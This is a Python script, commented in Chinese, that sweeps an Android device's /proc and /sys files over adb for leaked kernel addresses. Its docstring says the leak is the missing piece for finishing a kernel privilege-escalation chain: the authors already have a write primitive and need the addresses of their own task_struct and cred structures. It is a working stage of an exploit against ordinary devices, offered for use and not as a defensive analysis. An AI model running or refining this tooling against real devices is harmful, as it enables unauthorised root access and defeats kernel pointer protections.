#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""kptr_sweep.py —— 在 shell 域能读的 /proc、/sys 文件里找"裸内核指针"(十六进制长 token)。

为什么要它: 我们缺的**不是写**, 而是"自己的 task_struct/cred 地址"。rb_next 读通道判废
(指针链无界)、saved_command_line 载体在真机上没能生效 ⇒ 只要内核里存在任何一个
"world/shell 可读且原样印 %p/%px/%lx 内核地址"的文件, 提权链就立刻能收尾。

做法: 用 adb shell 的 find 列出候选文件(可读写入的普通文件), 再 cat 它们, 本地正则抓
`0x[0-9a-f]{11,16}` 和独立的 `[0-9a-f]{16}` token, 只报**看起来像核地址**(前缀 ffff…)的。
注意: 内核默认对 %p 做哈希(ptr_to_id), 真地址一般是 %px 或 %pS 或直接打印 —— 所以命中即高价值。
用法: python cm57/kptr_sweep.py
"""
import io, os, re, subprocess, sys, tempfile

ADB = r'C:\adb\platform-tools\adb.exe'
DEV = '<DEVICE_SERIAL>'
# 先扫覆盖面大、shell 通常能读的地方; 需要 root 的节点扫了也是 EACCES(会记 errno, 不报错)
ROOTS = ['/proc', '/sys/devices', '/sys/class', '/sys/kernel', '/sys/fs']
HEX = re.compile(r'(?:^|[\s=,:(])(0x[0-9a-fA-F]{10,16}|\b[0-9a-f]{16}\b)')
loose = []
HEX_LOOSE = re.compile(r'(?:^|[\s=,:(])(0x[0-9a-fA-F]{9,16}|[0-9a-f]{10,16})')
KERN = re.compile(r'(?:0x)?f{2,8}[0-9a-f]{6,}', re.I)


def sh(args, timeout=60):
    return subprocess.run(args, capture_output=True, text=True,
                          encoding='utf-8', errors='replace', timeout=timeout)


def list_files():
    # 注意: toybox 的 find **不支持** -readable(用它整个 find 会报错 ⇒ 0 结果), 只能先列后读
    # 每个根单独限 400 条: 上一版一个总 head 把 /proc 就把额度吃光, /sys 一条没扫到
    one = '; '.join('find %s -type f 2>/dev/null | head -400' % d for d in ROOTS)
    out = sh([ADB, '-s', DEV, 'shell', one])
    files = [l.strip() for l in (out.stdout or '').splitlines() if l.strip().startswith('/')]
    return files


def main():
    files = list_files()
    print('候选文件 %d 个' % len(files), flush=True)
    hits = 0
    # 一次批量 cat(每 40 个一组, 避免命令行过长); 标题行带上文件名便于定位
    for i in range(0, len(files), 40):
        batch = files[i:i + 40]
        one = 'for f in %s; do echo "@@ $f"; head -c 2000 "$f" 2>&1; echo; done' % ' '.join(
            "'%s'" % f for f in batch)
        r = sh([ADB, '-s', DEV, 'shell', one], timeout=300)
        cur = '?'
        for line in (r.stdout or '').splitlines():
            if line.startswith('@@ '):
                cur = line[3:].strip()
                continue
            for m in HEX_LOOSE.finditer(line):
                tok0 = m.group(1).lower().replace('0x', '')
                if len(tok0) >= 10 and re.search(r'[a-f]', tok0):
                    loose.append((cur, line.strip()[:130]))
            for m in HEX.finditer(line):
                tok = m.group(1).lower().replace('0x', '')
                if KERN.match(tok) and len(tok) >= 12 and re.match(r'^f{2,}[0-9a-f]{4,}', tok):
                    hits += 1
                    print('★ %-58s | %s' % (cur, line.strip()[:150]), flush=True)
                    break
    print('总命中(严格核地址样式) %d 行' % hits)
    print('宽松命中(含 hex 的长 token) %d 行, 前 25 条:' % len(loose))
    for c, l in loose[:25]: print('   %-52s | %s' % (c, l))


main()
